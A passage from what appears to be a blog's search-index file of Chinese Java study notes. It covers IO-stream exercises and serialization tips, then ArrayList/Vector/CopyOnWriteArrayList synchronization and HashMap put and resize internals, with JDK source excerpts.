&#123;</span><br><span class="line">        bufferedWriter.write(<span class="string">&quot;hello Jvav 世界&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>序列化需要注意的点</p></blockquote><ol><li>读写顺序一定一致</li><li>序列化，反序列化对象，需要实现Serializable</li><li>序列化的类中加入 SerialVersionUID,提高版本的兼容性</li><li>序列化对象时，其属性也都必须实现序列化接口</li><li>序列化具有继承性</li></ol><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><ol><li>创建文件，并写入内容</li><li>利用转化流，改变字符编码</li><li>读取properties文件，创建对象</li><li>将对象序列化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finalTest1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 1. 判断磁盘是否有mytemp文件，如果没有就创建mytemp</span></span><br><span class="line">        <span class="comment">// 创建文件前需要保证该路径是否存在，如果不存在应先创建对应的包</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/pack1/pack2/pack3/mytemp&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file.getParentFile().exists()) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">mkdirs</span> <span class="operator">=</span> file.getParentFile().mkdirs();</span><br><span class="line">            System.out.println(mkdirs?<span class="string">&quot;创建前提包&quot;</span>:<span class="string">&quot;创建失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">newFile</span> <span class="operator">=</span> file.createNewFile();</span><br><span class="line">            System.out.println(newFile?<span class="string">&quot;成功创建&quot;</span>:<span class="string">&quot;创建失败&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 2. 如果该文件已经存在 则输出文件已经存在，请不要重复创建了</span></span><br><span class="line">            System.out.println(<span class="string">&quot;文件已经存在，请不要重复创建了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 在该文件中追加hello , world</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileOutputStream.write(<span class="string">&quot;hello,world&quot;</span>.getBytes());</span><br><span class="line">            System.out.println(<span class="string">&quot;数据写入成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finalTest2</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 1. 使用BufferedReader 读取一个文本文件 为每一行加一个句号，并输出到屏幕</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(fileReader);</span><br><span class="line">        String readLen;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((readLen = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果不加\n 默认换行只返回&quot;&quot;，所有内容挤在一起</span></span><br><span class="line">                System.out.println(readLen+<span class="string">&quot;.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;输出结束&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.如果文本是gbk模式 出现了乱码</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>), <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        <span class="type">char</span>[] chars = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">readSize</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            while ((readSize = inputStreamReader.read(chars)) != -1) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(new String(chars,0,readSize));</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">while</span> ((readLen=bufferedReader1.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(readLen);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            bufferedReader1.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finalTest3</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 编写一个dog.properties 含有：name，age</span></span><br><span class="line">        <span class="comment">// 编写一个dog类，创建一个dog对象，并读取dog.properties相应的属性，并完成初始化。</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="comment">// 这里需要注意 IDEA的properties文件默认使用的编码ISO-8859-1，要么改为utf-8，要么读的时候改变字符编码格式</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/dog.properties&quot;</span>);</span><br><span class="line">        properties.load(fileReader);</span><br><span class="line">        properties.list(System.out);</span><br><span class="line">        <span class="comment">// 实例化dog对象</span></span><br><span class="line">        <span class="type">dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">dog</span>(properties.getProperty(<span class="string">&quot;name&quot;</span>), Integer.parseInt(properties.getProperty(<span class="string">&quot;age&quot;</span>)));</span><br><span class="line">        System.out.println(dog);</span><br><span class="line">        <span class="comment">// 关闭流</span></span><br><span class="line">        fileReader.close();</span><br><span class="line">        <span class="comment">// 将dog对象序列化到dog.dat文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/dog.dat&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(dog);</span><br><span class="line">        System.out.println(<span class="string">&quot;输出成功&quot;</span>);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​    我们上面列举到的实例，只是针对本地文件读取，这个最简单的，而真正需要我们去运用的是在网络IO中。不过基础还是得先打好。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础</title>
      <link href="/2022/11/25/Java/Java%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/11/25/Java/Java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><blockquote><p>如何将ArrayList变成同步操作？</p></blockquote><p><code>Collections.synchronizedList(arrayList);</code></p><p>Collections.synchronizedList是一个包装类，会将arrayList的一些操作进行加锁，这里我们注意：<strong>读写加锁，迭代器不加锁</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> c.add(e);&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.get(index);&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> list.iterator(); <span class="comment">// Must be manually synched by user!</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> list.listIterator(); <span class="comment">// Must be manually synched by user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> list.listIterator(index); <span class="comment">// Must be manually synched by user</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><blockquote><p>Collections.synchronizedList和Vector的区别?</p></blockquote><p>Vector底层维护的也是一个数组，每次扩容可以按照指定的数进行扩容，默认扩容两倍</p><p>特点就是所有操作进行同步，导致效率比较低</p><p>结论：Vector比较同步全面，Collections.synchronizedList在迭代时需要小心。</p><h3 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h3><p>也是一个线程安全版的ArrayList，适用于读多写少的场景，其中所有可变操作（add、set等等）都是通过对底层数组进行一次新的复制来实现的。所以频繁的写是消耗性能的。</p><blockquote><p>Collections.synchronizedList和CopyOnWriteArrayList怎么选择</p></blockquote><ol><li>多读少写优先考虑CopyOnWriteArrayList; </li><li>SyncList的’读写’都较为均衡，相比CopyOnWriterList其读操作更慢，写操作更快; </li><li>Copy…List的’写时复制原理’会导致’写操作’中间多出来一个’table’备份，从而占用内存，所以要特别注意防止内存溢出。</li></ol><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><blockquote><p>HashMap存储的是Key,Value.也就是一个个小节点，所以内部封装了Node类来存储值，再通过Node数组来存放一个个Node，这里有意思的就是Node它也是一个链表结构，当对key求Hash值时，如果数组上这个位置已经有值了，则直接绑定到之前加入节点的后面，很方便。既能做到查询快，插入也快。</p></blockquote><blockquote><p>HashMap中Put到底是怎么走的？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">  <span class="comment">//先对key求一个Hash值</span></span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">  <span class="comment">//这里初始化一个Node数组，一个Node节点</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line"><span class="comment">//判定Node数字有没有初始化过</span></span><br><span class="line">        <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">          <span class="comment">//如果没有，说明现在的Node数组是一个空数组，需要进行扩容后存放数据</span></span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">  <span class="comment">//通过数组中Hash位置判定，是否之前插入过数据</span></span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line"> <span class="comment">//如果没有直接在该节点上插入一个新的Node节点</span></span><br><span class="line">          tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//这里就是如果之前插入过一个节点，那现在就需要将新来的节点和之前的连接</span></span><br><span class="line">            Node&lt;K,V&gt; e; K k;</span><br><span class="line">            <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">                ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                e = p;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                            treeifyBin(tab, hash);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                    e.value = value;</span><br><span class="line">                afterNodeAccess(e);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">//统计有多少数据</span></span><br><span class="line">        ++modCount;</span><br><span class="line"><span class="comment">//判定是否需要扩容</span></span><br><span class="line">        <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        afterNodeInsertion(evict);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">  <span class="comment">//原来数组的大小</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCap</span> <span class="operator">=</span> (oldTab == <span class="literal">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">  <span class="comment">//老的临界点值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldThr</span> <span class="operator">=</span> threshold;</span><br><span class="line">        <span class="type">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">                threshold = Integer.MAX_VALUE;</span><br><span class="line">                <span class="keyword">return</span> oldTab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                     oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">                newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">            newCap = oldThr;</span><br><span class="line">  <span class="comment">//这里一般就是第一次使用时，进行默认初始化 容量：16   边界值：12   加载因子：0.75</span></span><br><span class="line">        <span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">            newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">            newThr = (<span class="type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)newCap * loadFactor;</span><br><span class="line">            newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                      (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        &#125;</span><br><span class="line">        threshold = newThr;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">  <span class="comment">// 一般是按照一倍扩容的</span></span><br><span class="line">        Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[newCap];</span><br><span class="line">        table = newTab;</span><br><span class="line">        <span class="keyword">if</span> (oldTab != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">                Node&lt;K,V&gt; e;</span><br><span class="line">                <span class="keyword">if</span> ((e = oldTab[j]) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    oldTab[j] = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (e.next == <span class="literal">null</span>)</span><br><span class="line">                        newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                        ((TreeNode&lt;K,V&gt;)e).split(<span class="built_in">this</span>, newTab, j, oldCap);</span><br><span class="line">                    <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                        Node&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; next;</span><br><span class="line">                        <span class="keyword">do</span> &#123;</span><br><span class="line">                            next = e.next;</span><br><span class="line">                            <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (loTail == <span class="literal">null</span>)</span><br><span class="line">                                    loHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = e;</span><br><span class="line">                                loTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (hiTail == <span class="literal">null</span>)</span><br><span class="line">                                    hiHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = e;</span><br><span class="line">                                hiTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">while</span> ((e = next) != <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (loTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                            loTail.next = <span class="literal">null</span>;</span><br><span class="line">                            newTab[j] = loHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                            hiTail.next = <span class="literal">null</span>;</span><br><span class="line">                            newTab[j + oldCap] = hiHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newTab;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="put-⽅法原理"><a href="#put-⽅法原理" class="headerlink" title="put() ⽅法原理"></a>put() ⽅法原理</h4><ol><li>先将Key，Value封装为一个Node。</li><li>通过HashCode()得出Hash值</li><li>通过哈希函数将Hash值装换为数组下标<ol><li>如果这个位置没有任何元素，则直接插入Node</li><li>如果已经有了Node链表，将当前Node的key与链表上每一个Key进行equals比较<ol><li>如果都返回false，则插入链表末尾</li><li>如果有true，则直接新的Node的value替代原来的。（保证不可重复）</li></ol></li></ol></li></ol><blockquote><p>注意：HashMap中允许key，value为null，但只能有一个</p><p>​     HashTable中key和value都不能为空</p></blockquote><h4 id="get-方法原理"><a href="#get-方法原理" class="headerlink" title="get() 方法原理"></a>get() 方法原理</h4><ol><li>通过key的HashCode()方法求出Hash值</li><li>通过哈希函数将hash值转为数组的下标</li><li>通过下标定位到数组的某个位置<ol><li>如果没有链表，直接返回Null</li><li>如果有链表，以此进行匹配每个节点上的key通过equals进行比较<ol><li>如果都为false，则返回null</li><li>如果为true，则返回值</li></ol></li></ol></li></ol><blockquote><p>放在HashMap中的key元素需要同时重写hashCode()和equals()方法</p></blockquote><h4 id="重写HashCode-和equals-方法"><a href="#重写HashCode-和equals-方法" class="headerlink" title="重写HashCode()和equals()方法"></a>重写HashCode()和equals()方法</h4><blockquote><p>一定要分布均匀</p><ol><li><p>如果hashCode()返回的一个值，就会变成单链表</p></li><li><p>如果hashCode()返回的都不一样值，HashMap就变成数组了</p></li></ol><p>这也称为分布不均匀</p><p>equals ，hashCode 需要同时重写，保证一个对象一旦相等，Hash值也应该相同</p></blockquote><h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><p>如果可以预测到容量最好，多设置一些，一方面避免频繁的扩容，一方面也需要考虑到加载因子的边界值</p><h4 id="为什么Map需要有加载因子，0-75"><a href="#为什么Map需要有加载因子，0-75" class="headerlink" title="为什么Map需要有加载因子，0.75"></a>为什么Map需要有加载因子，0.75</h4><ol><li>如果不设置边界值，Map的Hash碰撞概率到后面会越来越高，影响效率</li><li>0.75是一个普遍值，需要用数学证明</li></ol><h3 id="TreeMap"><a href="#TreeMap" class="headerlink" 